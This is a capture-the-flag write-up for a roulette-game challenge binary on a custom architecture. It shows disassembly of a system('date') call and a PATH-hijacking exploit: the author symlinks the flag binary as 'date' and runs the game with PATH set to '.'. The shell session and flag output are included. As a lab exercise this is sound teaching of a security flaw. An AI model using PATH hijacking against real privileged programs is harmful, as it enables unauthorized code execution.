# Binary exploit 3

We're given a [Femtium](femtium-notes.md) binary, that implements a roulette
style game similar to the [binexp2](binexp2.md) challenge, but this time, the
random number generator is not as flawed as in the previous case.

It looks like the source of randomness in this version is direct syscalls to
the kernel — presumably the getrandom(2) call. We could perhaps attempt to
control the random seed in the kernel or the emulator somehow to reduce the
problem to one we've already solved, but there's another bug in this version
that makes it significantly easier to gain control of this binary compared
to the previous version anyway:

I was looking through the disassembly, and in the `highscores` function, I came
across a call to the `system` function with an argument of `date`:

```
004022c0: 47df00d0  add     sp, sp,-48          ; Prologue
004022c4: 377f002c  stw     ra, [sp+44]
004022c8: 379f0028  stw     fp, [sp+40]
004022cc: 479f0030  add     fp, sp,48

004022d0: 83c03860  movi    t0, 0x000001c3      ; STRING: "date"
004022d4: 8bc00036  addi    t0, 0x00400000
004022d8: 406f0000  mov     a0, t0
004022dc: 477f800c  add     ra, ip,12           ; call
004022e0: 87207b22  movi    at0, 0x00000f64     ; ...
004022e4: 8f200000  addi    at0, 0x00000000     ; ...
004022e8: 47fff200  jmp     ip+at0              ; call 00403250: system
```

In other words, when displaying the high score list, the process calls out to
the shell to display the date. Since the argument is not the absolute location
of the date binary, the shell will use the PATH variable to find it. We control
the environment before invoking the executable, so we also control the PATH. We
can simply set the PATH such that a directory we control is before the real
location of the date command, put a new `date` command in the directory we
control, and the trick is done. In this case, the `binexp3/` directory itself
is owned by us, and the code we want to execute to get the flag is the
`binexp3_flag` binary, so we can simply make a symlink from that file to `date`,
run `binexp3` with a modified PATH, and view the highscore list:

```
hacker@sphinx # cd binexp3/
hacker@sphinx # ln -s binexp3_flag date
hacker@sphinx # PATH=. ./binexp3
                 _      _   _
 _ __ ___  _   _| | ___| |_| |_ ___
| '__/ _ \| | | | |/ _ \ __| __/ _ \
| | | (_) | |_| | |  __/ |_| ||  __/
|_|  \___/ \__,_|_|\___|\__|\__\___|

Welcome to the roulette v2.
This time we made sure the house always wins. Good luck.

Your current balance is $100

What do you want to do?
1> Play
2> View highscores
3> Exit
> 2
FE{Sh3_sells_C_shells_by_the_C_sh0re}

Latest highscores:
1. 1337 FENIX
2. 1085 torvalds
3. 1002 josh

Your current balance is $100

What do you want to do?
1> Play
2> View highscores
3> Exit
> 3
```


## Flag

`FE{Sh3_sells_C_shells_by_the_C_sh0re}`


---
_Peter Tirsek, 2020-01-20_
